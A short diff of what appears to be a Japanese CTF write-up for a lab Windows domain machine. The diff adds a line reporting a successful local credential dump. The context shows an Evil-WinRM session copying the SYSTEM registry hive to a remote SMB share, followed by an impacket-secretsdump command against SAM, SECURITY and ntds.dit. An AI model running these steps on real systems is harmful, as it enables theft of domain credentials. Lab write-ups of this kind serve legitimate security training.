@@ -373,7 +373,7 @@ The shadow copy was successfully exposed as z:\.
 
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> copy SYSTEM \\10.10.16.15\share\
 ```
-
+ローカルでクレデンシャルダンプ成功
 ```sh
 └─$ impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit LOCAL         
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
